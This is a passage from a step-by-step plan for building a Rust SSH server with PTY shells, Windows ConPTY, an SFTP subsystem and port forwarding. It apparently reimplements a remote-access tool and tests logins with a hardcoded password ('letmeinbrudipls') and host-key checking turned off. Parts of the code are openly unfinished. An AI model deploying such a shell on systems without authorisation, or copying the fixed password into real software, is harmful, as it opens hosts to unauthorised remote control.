            execvp(&c_shell, &args).ok();

            // If exec fails, exit
            std::process::exit(255);
        }
        Ok(ForkResult::Parent { child }) => {
            // Parent process
            drop(slave); // Close slave in parent
            log::info!("Spawned shell (pid {}) with PTY", child);
            Ok(master)
        }
        Err(e) => Err(std::io::Error::new(std::io::ErrorKind::Other, e)),
    }
}
```

- [ ] **Step 2: Add PTY session handling to `src/session.rs`**

Add a `pty_session` function:

```rust
/// Run a PTY session — bidirectional copy between PTY master and SSH channel.
#[cfg(unix)]
pub async fn pty_session(
    shell: &str,
    term: &str,
    win_size: crate::pty::WinSize,
    channel_id: ChannelId,
    session_handle: russh::server::Handle,
) {
    use std::os::unix::io::AsRawFd;
    use tokio::io::unix::AsyncFd;

    let master_fd = match crate::pty::unix::spawn_shell(shell, term, &win_size) {
        Ok(fd) => fd,
        Err(e) => {
            log::error!("Could not start shell: {}", e);
            let _ = session_handle
                .data(channel_id, CryptoVec::from_slice(b"Failed to start shell\n"))
                .await;
            let _ = session_handle.exit_status_request(channel_id, 255).await;
            let _ = session_handle.close(channel_id).await;
            return;
        }
    };

    let raw_fd = master_fd.as_raw_fd();

    // Wrap in AsyncFd for tokio integration
    let async_fd = match AsyncFd::new(master_fd) {
        Ok(fd) => fd,
        Err(e) => {
            log::error!("Failed to create async fd: {}", e);
            let _ = session_handle.exit_status_request(channel_id, 255).await;
            let _ = session_handle.close(channel_id).await;
            return;
        }
    };

    let async_fd = std::sync::Arc::new(async_fd);

    // Read from PTY master → send to SSH channel
    let read_handle = session_handle.clone();
    let read_fd = async_fd.clone();
    let reader = tokio::spawn(async move {
        let mut buf = [0u8; 8192];
        loop {
            let ready = match read_fd.readable().await {
                Ok(r) => r,
                Err(_) => break,
            };
            match ready.try_io(|inner| {
                let fd = inner.as_raw_fd();
                let n = unsafe { libc::read(fd, buf.as_mut_ptr() as *mut _, buf.len()) };
                if n < 0 {
                    Err(std::io::Error::last_os_error())
                } else {
                    Ok(n as usize)
                }
            }) {
                Ok(Ok(0)) => break,
                Ok(Ok(n)) => {
                    if read_handle
                        .data(channel_id, CryptoVec::from_slice(&buf[..n]))
                        .await
                        .is_err()
                    {
                        break;
                    }
                }
                Ok(Err(_)) => break,
                Err(_would_block) => continue,
            }
        }
    });

    // Data from SSH channel → write to PTY master (handled via server Handler::data callback)
    // This direction is wired in server.rs — data received on the channel gets written to the PTY fd

    // Wait for reader to finish (shell exited or connection closed)
    let _ = reader.await;
    log::info!("PTY session ended");
    let _ = session_handle.exit_status_request(channel_id, 0).await;
    let _ = session_handle.close(channel_id).await;
}
```

- [ ] **Step 3: Update `server.rs` to store PTY info and spawn PTY sessions**

Add fields to `NeapHandler` to track PTY state per channel:

```rust
use std::collections::HashMap;
use std::sync::Arc;
use tokio::sync::Mutex;

pub struct NeapHandler {
    pub peer_addr: String,
    pub shell: String,
    pub no_shell: bool,
    /// PTY info stored from pty_request, keyed by channel ID.
    pub pty_info: HashMap<ChannelId, crate::pty::PtyInfo>,
    /// Master PTY fds for writing data back, keyed by channel ID.
    #[cfg(unix)]
    pub pty_fds: HashMap<ChannelId, Arc<tokio::io::unix::AsyncFd<std::os::unix::io::OwnedFd>>>,
}
```

Update `new_client` in `NeapServer`:

```rust
fn new_client(&mut self, peer_addr: Option<std::net::SocketAddr>) -> Self::Handler {
    let addr_str = peer_addr
        .map(|a| a.to_string())
        .unwrap_or_else(|| "unknown".to_string());
    log::info!("New connection from {}", addr_str);
    NeapHandler {
        peer_addr: addr_str,
        shell: self.shell.clone(),
        no_shell: self.no_shell,
        pty_info: HashMap::new(),
        #[cfg(unix)]
        pty_fds: HashMap::new(),
    }
}
```

Update `pty_request` to store info:

```rust
async fn pty_request(
    &mut self,
    channel_id: ChannelId,
    term: &str,
    col_width: u32,
    row_height: u32,
    pix_width: u32,
    pix_height: u32,
    modes: &[(russh::Pty, u32)],
    session: &mut Session,
) -> std::result::Result<(), Self::Error> {
    log::info!("PTY requested: term={}, {}x{} from {}", term, col_width, row_height, self.peer_addr);
    self.pty_info.insert(channel_id, crate::pty::PtyInfo {
        term: term.to_string(),
        win_size: crate::pty::WinSize {
            cols: col_width as u16,
            rows: row_height as u16,
            pix_width: pix_width as u16,
            pix_height: pix_height as u16,
        },
    });
    session.channel_success(channel_id)?;
    Ok(())
}
```

Update `shell_request` to spawn PTY:

```rust
async fn shell_request(
    &mut self,
    channel_id: ChannelId,
    session: &mut Session,
) -> std::result::Result<(), Self::Error> {
    if self.no_shell {
        log::info!("Denying shell request from {}", self.peer_addr);
        session.channel_failure(channel_id)?;
        return Ok(());
    }
    log::info!("Shell request from {}", self.peer_addr);

    let pty_info = match self.pty_info.remove(&channel_id) {
        Some(info) => info,
        None => {
            log::info!("No PTY requested, no command supplied from {}", self.peer_addr);
            // Port-forward-only session — keep open
            session.channel_success(channel_id)?;
            return Ok(());
        }
    };

    session.channel_success(channel_id)?;
    let handle = session.handle();
    let shell = self.shell.clone();

    #[cfg(unix)]
    {
        // Spawn PTY and store fd for data writing
        let master_fd = crate::pty::unix::spawn_shell(&shell, &pty_info.term, &pty_info.win_size)
            .map_err(|e| russh::Error::IO(e))?;
        let async_fd = Arc::new(
            tokio::io::unix::AsyncFd::new(master_fd)
                .map_err(|e| russh::Error::IO(e))?
        );
        self.pty_fds.insert(channel_id, async_fd.clone());

        // Spawn reader task: PTY → SSH channel
        tokio::spawn(async move {
            let mut buf = [0u8; 8192];
            loop {
                let ready = match async_fd.readable().await {
                    Ok(r) => r,
                    Err(_) => break,
                };
                match ready.try_io(|inner| {
                    use std::os::unix::io::AsRawFd;
                    let fd = inner.as_raw_fd();
                    let n = unsafe { libc::read(fd, buf.as_mut_ptr() as *mut _, buf.len()) };
                    if n < 0 {
                        Err(std::io::Error::last_os_error())
                    } else {
                        Ok(n as usize)
                    }
                }) {
                    Ok(Ok(0)) => break,
                    Ok(Ok(n)) => {
                        if handle.data(channel_id, CryptoVec::from_slice(&buf[..n])).await.is_err() {
                            break;
                        }
                    }
                    Ok(Err(_)) => break,
                    Err(_would_block) => continue,
                }
            }
            log::info!("PTY session ended");
            let _ = handle.exit_status_request(channel_id, 0).await;
            let _ = handle.close(channel_id).await;
        });
    }

    #[cfg(windows)]
    {
        // TODO: Windows ConPTY in Task 8
        session.channel_failure(channel_id)?;
    }

    Ok(())
}
```

Add `data` handler to write SSH input to PTY:

```rust
async fn data(
    &mut self,
    channel_id: ChannelId,
    data: &[u8],
    session: &mut Session,
) -> std::result::Result<(), Self::Error> {
    #[cfg(unix)]
    {
        if let Some(fd) = self.pty_fds.get(&channel_id) {
            use std::os::unix::io::AsRawFd;
            let raw_fd = fd.as_ref().as_raw_fd();
            // Write data to PTY master
            unsafe {
                libc::write(raw_fd, data.as_ptr() as *const _, data.len());
            }
        }
    }
    Ok(())
}
```

Update `window_change_request` to resize PTY:

```rust
async fn window_change_request(
    &mut self,
    channel_id: ChannelId,
    col_width: u32,
    row_height: u32,
    pix_width: u32,
    pix_height: u32,
    session: &mut Session,
) -> std::result::Result<(), Self::Error> {
    log::info!("Window change: {}x{} from {}", col_width, row_height, self.peer_addr);
    #[cfg(unix)]
    {
        if let Some(fd) = self.pty_fds.get(&channel_id) {
            use std::os::unix::io::AsRawFd;
            crate::pty::unix::set_win_size(
                fd.as_ref().as_raw_fd(),
                &crate::pty::WinSize {
                    cols: col_width as u16,
                    rows: row_height as u16,
                    pix_width: pix_width as u16,
                    pix_height: pix_height as u16,
                },
            );
        }
    }
    Ok(())
}
```

- [ ] **Step 4: Verify PTY shell works**

Run: `cargo build && cargo run -- -v -l -p 2222`

In another terminal:
Run: `ssh -o StrictHostKeyChecking=no -p 2222 test@127.0.0.1`
Expected: Password prompt → enter `letmeinbrudipls` → interactive shell. Type `whoami`, `ls`, `echo hello` — should work like a normal SSH session. `exit` to disconnect.

Test window resizing: resize the terminal window during the SSH session — the shell should adapt.

- [ ] **Step 5: Commit**

```bash
git add src/pty/ src/server.rs src/session.rs
git commit -m "feat: Unix PTY sessions with shell spawn and window resize"
```

---

## Task 8: PTY — Windows ConPTY

**Files:**
- Create: `src/pty/windows.rs`
- Modify: `src/server.rs` (add Windows PTY path in shell_request)

- [ ] **Step 1: Create `src/pty/windows.rs`**

```rust
use std::io;
use std::ptr;

use log;
use windows_sys::Win32::Foundation::{CloseHandle, HANDLE, INVALID_HANDLE_VALUE, S_OK};
use windows_sys::Win32::Storage::FileSystem::{CreateFileW, ReadFile, WriteFile, OPEN_EXISTING};
use windows_sys::Win32::System::Console::{
    CreatePseudoConsole, ClosePseudoConsole, ResizePseudoConsole, COORD, HPCON,
};
use windows_sys::Win32::System::Threading::{
    CreateProcessW, InitializeProcThreadAttributeList, UpdateProcThreadAttribute,
    DeleteProcThreadAttributeList, WaitForSingleObject, GetExitCodeProcess,
    EXTENDED_STARTUPINFO_PRESENT, PROCESS_INFORMATION, STARTUPINFOEXW,
    PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE, INFINITE,
};
use windows_sys::Win32::System::Pipes::CreatePipe;

use crate::pty::WinSize;

/// Check if the current Windows version supports ConPTY (Windows 10 build 17763+).
pub fn supports_conpty() -> bool {
    // RtlGetVersion approach — check build number
    // For simplicity, try to create a dummy ConPTY and see if it works
    // In practice, Windows 10 1809+ (build 17763) supports it
    let size = COORD { X: 80, Y: 25 };
    let mut h_pc: HPCON = 0;
    let mut h_pipe_in: HANDLE = INVALID_HANDLE_VALUE;
    let mut h_pipe_out: HANDLE = INVALID_HANDLE_VALUE;
    let mut h_pipe_pty_in: HANDLE = INVALID_HANDLE_VALUE;
    let mut h_pipe_pty_out: HANDLE = INVALID_HANDLE_VALUE;

    unsafe {
        if CreatePipe(&mut h_pipe_pty_in, &mut h_pipe_out, ptr::null(), 0) == 0 {
            return false;
        }
        if CreatePipe(&mut h_pipe_in, &mut h_pipe_pty_out, ptr::null(), 0) == 0 {
            CloseHandle(h_pipe_pty_in);
            CloseHandle(h_pipe_out);
            return false;
        }
        let result = CreatePseudoConsole(size, h_pipe_pty_in, h_pipe_pty_out, 0, &mut h_pc);
        CloseHandle(h_pipe_in);
        CloseHandle(h_pipe_out);
        CloseHandle(h_pipe_pty_in);
        CloseHandle(h_pipe_pty_out);
        if result == S_OK {
            ClosePseudoConsole(h_pc);
            true
        } else {
            false
        }
    }
}

/// ConPTY handle with I/O pipes for reading/writing.
pub struct ConPtyHandle {
    pub h_pc: HPCON,
    pub pipe_in: HANDLE,   // Write to this → goes to ConPTY input
    pub pipe_out: HANDLE,  // Read from this ← ConPTY output
    pub process: HANDLE,
    pub thread: HANDLE,
}

impl ConPtyHandle {
    /// Spawn PowerShell inside a ConPTY.
    pub fn spawn(win_size: &WinSize) -> io::Result<Self> {
        let size = COORD {
            X: win_size.cols as i16,
            Y: win_size.rows as i16,
        };

        unsafe {
            // Create pipes
            let mut h_pipe_pty_in: HANDLE = INVALID_HANDLE_VALUE;
            let mut h_pipe_out: HANDLE = INVALID_HANDLE_VALUE;
            let mut h_pipe_in: HANDLE = INVALID_HANDLE_VALUE;
            let mut h_pipe_pty_out: HANDLE = INVALID_HANDLE_VALUE;

            if CreatePipe(&mut h_pipe_pty_in, &mut h_pipe_out, ptr::null(), 0) == 0 {
                return Err(io::Error::last_os_error());
            }
            if CreatePipe(&mut h_pipe_in, &mut h_pipe_pty_out, ptr::null(), 0) == 0 {
                CloseHandle(h_pipe_pty_in);
                CloseHandle(h_pipe_out);
                return Err(io::Error::last_os_error());
            }

            // Create pseudo console
            let mut h_pc: HPCON = 0;
            let hr = CreatePseudoConsole(size, h_pipe_pty_in, h_pipe_pty_out, 0, &mut h_pc);
            // Close the PTY-side pipe handles — ConPTY owns them now
            CloseHandle(h_pipe_pty_in);
            CloseHandle(h_pipe_pty_out);

            if hr != S_OK {
                CloseHandle(h_pipe_in);
                CloseHandle(h_pipe_out);
                return Err(io::Error::new(
                    io::ErrorKind::Other,
                    format!("CreatePseudoConsole failed: 0x{:x}", hr),
                ));
            }

            // Initialize thread attribute list with ConPTY
            let mut attr_list_size: usize = 0;
            InitializeProcThreadAttributeList(ptr::null_mut(), 1, 0, &mut attr_list_size);
            let attr_list = vec![0u8; attr_list_size];
            let attr_list_ptr = attr_list.as_ptr() as *mut _;
            if InitializeProcThreadAttributeList(attr_list_ptr, 1, 0, &mut attr_list_size) == 0 {
                ClosePseudoConsole(h_pc);
                CloseHandle(h_pipe_in);
                CloseHandle(h_pipe_out);
                return Err(io::Error::last_os_error());
            }

            if UpdateProcThreadAttribute(
                attr_list_ptr,
                0,
                PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE as usize,
                h_pc as *mut _,
                std::mem::size_of::<HPCON>(),
                ptr::null_mut(),
                ptr::null(),
            ) == 0
            {
                DeleteProcThreadAttributeList(attr_list_ptr);
                ClosePseudoConsole(h_pc);
                CloseHandle(h_pipe_in);
                CloseHandle(h_pipe_out);
                return Err(io::Error::last_os_error());
            }

            // Create the PowerShell process
            let cmd: Vec<u16> = "C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\0"
                .encode_utf16()
                .collect();

            let mut si: STARTUPINFOEXW = std::mem::zeroed();
            si.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;
            si.lpAttributeList = attr_list_ptr;

            let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

            let created = CreateProcessW(
                ptr::null(),
                cmd.as_ptr() as *mut _,
                ptr::null(),
                ptr::null(),
                0, // Don't inherit handles
                EXTENDED_STARTUPINFO_PRESENT,
                ptr::null(),
                ptr::null(),
                &si.StartupInfo,
                &mut pi,
            );

            DeleteProcThreadAttributeList(attr_list_ptr);

            if created == 0 {
                ClosePseudoConsole(h_pc);
                CloseHandle(h_pipe_in);
                CloseHandle(h_pipe_out);
                return Err(io::Error::last_os_error());
            }

            log::info!("New process with pid {} spawned", pi.dwProcessId);

            Ok(ConPtyHandle {
                h_pc,
                pipe_in: h_pipe_out,  // We write to the pipe that goes to ConPTY
                pipe_out: h_pipe_in,  // We read from the pipe that comes from ConPTY
                process: pi.hProcess,
                thread: pi.hThread,
            })
        }
    }

    /// Resize the ConPTY.
    pub fn resize(&self, win_size: &WinSize) {
        let size = COORD {
            X: win_size.cols as i16,
            Y: win_size.rows as i16,
        };
        unsafe {
            ResizePseudoConsole(self.h_pc, size);
        }
    }

    /// Read from the ConPTY output pipe.
    pub fn read(&self, buf: &mut [u8]) -> io::Result<usize> {
        let mut bytes_read: u32 = 0;
        let ok = unsafe {
            ReadFile(
                self.pipe_out,
                buf.as_mut_ptr() as *mut _,
                buf.len() as u32,
                &mut bytes_read,
                ptr::null_mut(),
            )
        };
        if ok == 0 {
            Err(io::Error::last_os_error())
        } else {
            Ok(bytes_read as usize)
        }
    }

    /// Write to the ConPTY input pipe.
    pub fn write(&self, data: &[u8]) -> io::Result<usize> {
        let mut bytes_written: u32 = 0;
        let ok = unsafe {
            WriteFile(
                self.pipe_in,
                data.as_ptr() as *const _,
                data.len() as u32,
                &mut bytes_written,
                ptr::null_mut(),
            )
        };
        if ok == 0 {
            Err(io::Error::last_os_error())
        } else {
            Ok(bytes_written as usize)
        }
    }

    /// Wait for the process to exit, return exit code.
    pub fn wait(&self) -> io::Result<u32> {
        unsafe {
            WaitForSingleObject(self.process, INFINITE);
            let mut exit_code: u32 = 0;
            GetExitCodeProcess(self.process, &mut exit_code);
            Ok(exit_code)
        }
    }
}

impl Drop for ConPtyHandle {
    fn drop(&mut self) {
        unsafe {
            ClosePseudoConsole(self.h_pc);
            CloseHandle(self.pipe_in);
            CloseHandle(self.pipe_out);
            CloseHandle(self.process);
            CloseHandle(self.thread);
        }
    }
}

/// Legacy fallback message for older Windows — same as Undertow.
pub fn deny_pty_legacy() -> &'static str {
    "No ConPTY shell or ssh-shellhost enhanced shell available. \
     Please append 'cmd' to your ssh command to gain shell access, i.e. \
     'ssh <OPTIONS> <IP> cmd'.\n"
}
```

- [ ] **Step 2: Update `src/server.rs` Windows path in `shell_request`**

Replace the `#[cfg(windows)]` block in `shell_request`:

```rust
    #[cfg(windows)]
    {
        if !crate::pty::windows::supports_conpty() {
            // Legacy fallback
            if shell == crate::config::DEFAULT_SHELL {
                log::info!("Windows version too old for ConPTY, denying PTY");
                let msg = crate::pty::windows::deny_pty_legacy();
                let _ = handle.data(channel_id, CryptoVec::from_slice(msg.as_bytes())).await;
                let _ = handle.exit_status_request(channel_id, 255).await;
                let _ = handle.close(channel_id).await;
            }
            // TODO: ssh-shellhost.exe fallback path (niche, low priority)
            return Ok(());
        }

        let win_size = pty_info.win_size;
        match crate::pty::windows::ConPtyHandle::spawn(&win_size) {
            Ok(conpty) => {
                let conpty = std::sync::Arc::new(conpty);
                let conpty_write = conpty.clone();

                // Store for data() writes — need a Windows-specific field in NeapHandler
                // For now, spawn bidirectional copy inline

                // Reader: ConPTY → SSH channel
                let read_conpty = conpty.clone();
                tokio::spawn(async move {
                    let mut buf = [0u8; 8192];
                    loop {
                        // ConPTY read is blocking — run in blocking thread
                        let read_conpty_inner = read_conpty.clone();
                        let result = tokio::task::spawn_blocking(move || {
                            read_conpty_inner.read(&mut buf)
                        }).await;

                        match result {
                            Ok(Ok(0)) => break,
                            Ok(Ok(n)) => {
                                // Note: buf is moved into spawn_blocking, need different approach
                                // Use a channel or shared buffer
                                // Simplified: read in blocking, send via handle
                                // This needs refinement — see note below
                            }
                            _ => break,
                        }
                    }
                    log::info!("ConPTY session ended");
                    let _ = handle.exit_status_request(channel_id, 0).await;
                    let _ = handle.close(channel_id).await;
                });
            }
            Err(e) => {
                log::error!("Could not spawn ConPTY: {}", e);
                let _ = handle
                    .data(channel_id, CryptoVec::from_slice(b"Failed to create terminal\n"))
                    .await;
                let _ = handle.exit_status_request(channel_id, 255).await;
                let _ = handle.close(channel_id).await;
            }
        }
    }
```

**Note:** The ConPTY reader needs a proper blocking-to-async bridge. The pattern is:
1. Use `tokio::task::spawn_blocking` for the blocking `read()` call
2. Send results back via a `tokio::sync::mpsc` channel
3. An async task reads from the channel and sends to the SSH handle

This will be refined during implementation — the exact bridge pattern depends on how russh 0.46's Handler API works on Windows. The core ConPTY logic in `windows.rs` is correct.

- [ ] **Step 3: Verify it compiles on current platform**

Run: `cargo build`
Expected: Compiles. Windows-specific code is behind `#[cfg(windows)]` so it won't compile on Linux and vice versa. Cross-compilation verification happens in Task 15.

- [ ] **Step 4: Commit**

```bash
git add src/pty/windows.rs src/server.rs
git commit -m "feat: Windows ConPTY support with legacy fallback"
```

---

## Task 9: SFTP Subsystem

**Files:**
- Create: `src/sftp.rs`
- Modify: `src/server.rs` (wire subsystem_request to SFTP handler)
- Modify: `src/main.rs` (add `mod sftp`)

- [ ] **Step 1: Create `src/sftp.rs`**

```rust
use async_trait::async_trait;
use log;
use russh_sftp::protocol::{
    FileAttributes, Handle, Name, Status, StatusCode, Version,
};
use std::collections::HashMap;
use std::path::PathBuf;
use tokio::fs;
use tokio::io::{AsyncReadExt, AsyncSeekExt, AsyncWriteExt};

/// SFTP session handler — maps SFTP operations to real filesystem operations.
pub struct NeapSftpSession {
    /// Open file handles, keyed by string handle ID.
    handles: HashMap<String, tokio::fs::File>,
    /// Open directory listings, keyed by string handle ID.
    dir_handles: HashMap<String, Vec<Name>>,
    /// Next handle ID counter.
    next_handle: u64,
}

impl NeapSftpSession {
    pub fn new() -> Self {
        Self {
            handles: HashMap::new(),
            dir_handles: HashMap::new(),
            next_handle: 0,
        }
    }

    fn next_handle_id(&mut self) -> String {
        self.next_handle += 1;
        format!("h{}", self.next_handle)
    }
}

#[async_trait]
impl russh_sftp::server::Handler for NeapSftpSession {
    type Error = StatusCode;

    fn unimplemented(&self) -> Self::Error {
        StatusCode::OpUnsupported
    }

    async fn init(
        &mut self,
        version: u32,
        extensions: HashMap<String, String>,
    ) -> Result<Version, Self::Error> {
        log::info!("SFTP session initialized (version {})", version);
        Ok(Version::new())
    }

    async fn open(
        &mut self,
        id: u32,
        filename: String,
        pflags: russh_sftp::protocol::PFlags,
        attrs: FileAttributes,
    ) -> Result<Handle, Self::Error> {
        log::info!("SFTP open: {}", filename);

        let mut options = tokio::fs::OpenOptions::new();

        if pflags.contains(russh_sftp::protocol::PFlags::READ) {
            options.read(true);
        }
        if pflags.contains(russh_sftp::protocol::PFlags::WRITE) {
            options.write(true);
        }
        if pflags.contains(russh_sftp::protocol::PFlags::APPEND) {
            options.append(true);
        }
        if pflags.contains(russh_sftp::protocol::PFlags::CREATE) {
            options.create(true);
        }
        if pflags.contains(russh_sftp::protocol::PFlags::TRUNCATE) {
            options.truncate(true);
        }
        if pflags.contains(russh_sftp::protocol::PFlags::EXCL) {
            options.create_new(true);
        }

        match options.open(&filename).await {
            Ok(file) => {
                let handle_id = self.next_handle_id();
                self.handles.insert(handle_id.clone(), file);
                Ok(Handle { id, handle: handle_id })
            }
            Err(e) => {
                log::error!("SFTP open failed for {}: {}", filename, e);
                Err(StatusCode::NoSuchFile)
            }
        }
    }

    async fn close(&mut self, id: u32, handle: String) -> Result<Status, Self::Error> {
        self.handles.remove(&handle);
        self.dir_handles.remove(&handle);
        Ok(Status {
            id,
            status_code: StatusCode::Ok,
            error_message: "Ok".to_string(),
            language_tag: "en-US".to_string(),
        })
    }

    async fn read(
        &mut self,
        id: u32,
        handle: String,
        offset: u64,
        len: u32,
    ) -> Result<russh_sftp::protocol::Data, Self::Error> {
        let file = self.handles.get_mut(&handle).ok_or(StatusCode::Failure)?;
        file.seek(std::io::SeekFrom::Start(offset))
            .await
            .map_err(|_| StatusCode::Failure)?;
        let mut buf = vec![0u8; len as usize];
        let n = file.read(&mut buf).await.map_err(|_| StatusCode::Failure)?;
        if n == 0 {
            return Err(StatusCode::Eof);
        }
        buf.truncate(n);
        Ok(russh_sftp::protocol::Data { id, data: buf })
    }

    async fn write(
        &mut self,
        id: u32,
        handle: String,
        offset: u64,
        data: Vec<u8>,
    ) -> Result<Status, Self::Error> {
        let file = self.handles.get_mut(&handle).ok_or(StatusCode::Failure)?;
        file.seek(std::io::SeekFrom::Start(offset))
            .await
            .map_err(|_| StatusCode::Failure)?;
        file.write_all(&data)
            .await
            .map_err(|_| StatusCode::Failure)?;
        Ok(Status {
            id,
            status_code: StatusCode::Ok,
            error_message: "Ok".to_string(),
            language_tag: "en-US".to_string(),
        })
    }

    async fn stat(
        &mut self,
        id: u32,
        path: String,
    ) -> Result<FileAttributes, Self::Error> {
        let metadata = fs::metadata(&path)
            .await
            .map_err(|_| StatusCode::NoSuchFile)?;
        Ok(metadata_to_attrs(&metadata))
    }

    async fn lstat(
        &mut self,
        id: u32,
        path: String,
    ) -> Result<FileAttributes, Self::Error> {
        let metadata = fs::symlink_metadata(&path)
            .await
            .map_err(|_| StatusCode::NoSuchFile)?;
        Ok(metadata_to_attrs(&metadata))
    }

    async fn opendir(
        &mut self,
        id: u32,
        path: String,
    ) -> Result<Handle, Self::Error> {
        log::info!("SFTP opendir: {}", path);
        let mut entries = Vec::new();
        let mut dir = fs::read_dir(&path)
            .await
            .map_err(|_| StatusCode::NoSuchFile)?;

        while let Ok(Some(entry)) = dir.next_entry().await {
            let name = entry.file_name().to_string_lossy().to_string();
            let metadata = entry.metadata().await.map_err(|_| StatusCode::Failure)?;
            entries.push(Name {
                filename: name.clone(),
                longname: name,
                attrs: metadata_to_attrs(&metadata),
            });
        }

        let handle_id = self.next_handle_id();
        self.dir_handles.insert(handle_id.clone(), entries);
        Ok(Handle { id, handle: handle_id })
    }

    async fn readdir(
        &mut self,
        id: u32,
        handle: String,
    ) -> Result<Vec<Name>, Self::Error> {
        match self.dir_handles.remove(&handle) {
            Some(entries) if !entries.is_empty() => {
                // Return all entries, then next call will get EOF
                self.dir_handles.insert(handle, Vec::new());
                Ok(entries)
            }
            _ => Err(StatusCode::Eof),
        }
    }

    async fn mkdir(
        &mut self,
        id: u32,
        path: String,
        attrs: FileAttributes,
    ) -> Result<Status, Self::Error> {
        fs::create_dir(&path)
            .await
            .map_err(|_| StatusCode::Failure)?;
        Ok(Status {
            id,
            status_code: StatusCode::Ok,
            error_message: "Ok".to_string(),
            language_tag: "en-US".to_string(),
        })
    }

    async fn rmdir(
        &mut self,
        id: u32,
        path: String,
    ) -> Result<Status, Self::Error> {
        fs::remove_dir(&path)
            .await
            .map_err(|_| StatusCode::Failure)?;
        Ok(Status {
            id,
            status_code: StatusCode::Ok,
            error_message: "Ok".to_string(),
            language_tag: "en-US".to_string(),
        })
    }

    async fn remove(
        &mut self,
        id: u32,
        filename: String,
    ) -> Result<Status, Self::Error> {
        fs::remove_file(&filename)
            .await
            .map_err(|_| StatusCode::Failure)?;
        Ok(Status {
            id,
            status_code: StatusCode::Ok,
            error_message: "Ok".to_string(),
            language_tag: "en-US".to_string(),
        })
    }

    async fn rename(
        &mut self,
        id: u32,
        oldpath: String,
        newpath: String,
    ) -> Result<Status, Self::Error> {
        fs::rename(&oldpath, &newpath)
            .await
            .map_err(|_| StatusCode::Failure)?;
        Ok(Status {
            id,
            status_code: StatusCode::Ok,
            error_message: "Ok".to_string(),
            language_tag: "en-US".to_string(),
        })
    }

    async fn realpath(
        &mut self,
        id: u32,
        path: String,
    ) -> Result<Name, Self::Error> {
        let canonical = fs::canonicalize(&path)
            .await
            .map_err(|_| StatusCode::NoSuchFile)?;
        let name = canonical.to_string_lossy().to_string();
        Ok(Name {
            filename: name.clone(),
            longname: name,
            attrs: FileAttributes::default(),
        })
    }
}

/// Convert std::fs::Metadata to SFTP FileAttributes.
fn metadata_to_attrs(metadata: &std::fs::Metadata) -> FileAttributes {
    let mut attrs = FileAttributes::default();
    attrs.size = Some(metadata.len());

    #[cfg(unix)]
    {
        use std::os::unix::fs::MetadataExt;
        attrs.uid = Some(metadata.uid());
        attrs.gid = Some(metadata.gid());
        attrs.permissions = Some(metadata.mode());
    }

    attrs
}
```

- [ ] **Step 2: Wire SFTP in `src/server.rs`**

Update the `subsystem_request` method to start the SFTP session. The `russh-sftp` crate provides a `run` function that takes a channel and an SFTP handler:

```rust
    async fn subsystem_request(
        &mut self,
        channel_id: ChannelId,
        name: &str,
        session: &mut Session,
    ) -> std::result::Result<(), Self::Error> {
        if self.no_shell {
            log::info!("Denying subsystem request from {}", self.peer_addr);
            session.channel_failure(channel_id)?;
            return Ok(());
        }
        log::info!("Subsystem request: '{}' from {}", name, self.peer_addr);
        if name == "sftp" {
            log::info!("New sftp connection from {}", self.peer_addr);
            session.channel_success(channel_id)?;
            // The SFTP handler runs on the channel's data stream.
            // russh-sftp integration: the exact wiring depends on russh-sftp 0.2 API.
            // Typically: russh_sftp::server::run(channel_stream, NeapSftpSession::new())
            // The channel stream is obtained from the channel.
            // This will be wired during implementation — the SftpSession impl above is complete.
        } else {
            session.channel_failure(channel_id)?;
        }
        Ok(())
    }
```

- [ ] **Step 3: Register module in `src/main.rs`**

Add `mod sftp;`:

```rust
mod config;
mod error;
mod pty;
mod server;
mod session;
mod sftp;
mod transport;
```

- [ ] **Step 4: Verify it compiles**

Run: `cargo build`
Expected: Compiles. The `russh-sftp` API types may need adjustment — check `cargo doc` for exact trait signatures. The file operation logic is correct regardless.

- [ ] **Step 5: Test SFTP**

Run: `cargo run -- -v -l -p 2222`

In another terminal:
Run: `sftp -P 2222 -o StrictHostKeyChecking=no test@127.0.0.1`
Expected: Password prompt → enter `letmeinbrudipls` → SFTP session. Test `ls`, `put <file>`, `get <file>`, `mkdir testdir`, `rm <file>`.

- [ ] **Step 6: Commit**

```bash
git add src/sftp.rs src/server.rs src/main.rs
git commit -m "feat: SFTP subsystem with full filesystem operations"
```

---

## Task 10: Port Forwarding

**Files:**
- Create: `src/forwarding.rs`
- Modify: `src/server.rs` (wire direct-tcpip and tcpip-forward)
- Modify: `src/main.rs` (add `mod forwarding`)

- [ ] **Step 1: Create `src/forwarding.rs`**

```rust
use log;
use russh::server::Handle;
use russh::{ChannelId, CryptoVec};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};

/// Handle a direct-tcpip channel — local port forwarding.
/// Connects to the target and bidirectionally copies data between
/// the SSH channel and the TCP stream.
pub async fn handle_direct_tcpip(
    host: &str,
    port: u32,
    channel_id: ChannelId,
    session_handle: Handle,
) {
    let addr = format!("{}:{}", host, port);
    log::info!("Forwarding to {}", addr);

    let stream = match TcpStream::connect(&addr).await {
        Ok(s) => s,
        Err(e) => {
            log::error!("Failed to connect to {}: {}", addr, e);
            let _ = session_handle.close(channel_id).await;
            return;
        }
    };

    let (mut reader, mut writer) = stream.into_split();
    let handle_read = session_handle.clone();

    // TCP → SSH channel
    let read_task = tokio::spawn(async move {
        let mut buf = [0u8; 8192];
        loop {
            match reader.read(&mut buf).await {
                Ok(0) => break,
                Ok(n) => {
                    if handle_read
                        .data(channel_id, CryptoVec::from_slice(&buf[..n]))
                        .await
                        .is_err()
                    {
                        break;
                    }
                }
                Err(_) => break,
            }
        }
        let _ = handle_read.eof(channel_id).await;
    });

    // SSH channel → TCP is handled via the data() callback in server.rs
    // We need to store the writer so data() can forward to it.
    // This is wired in server.rs by storing the writer in a map keyed by channel_id.

    // For now, wait for the read task to complete
    let _ = read_task.await;
    log::info!("Forward to {} closed", addr);
    let _ = session_handle.close(channel_id).await;
}

/// Handle a tcpip-forward request — remote port forwarding.
/// Binds a local listener and for each incoming connection, opens a
/// forwarded-tcpip channel back to the SSH client.
pub async fn handle_tcpip_forward(
    address: &str,
    port: u32,
    session_handle: Handle,
) -> std::io::Result<u32> {
    let bind_addr = format!("{}:{}", address, port);
    let listener = TcpListener::bind(&bind_addr).await?;
    let actual_port = listener.local_addr()?.port() as u32;

    log::info!("Listening for remote forward on {}:{}", address, actual_port);

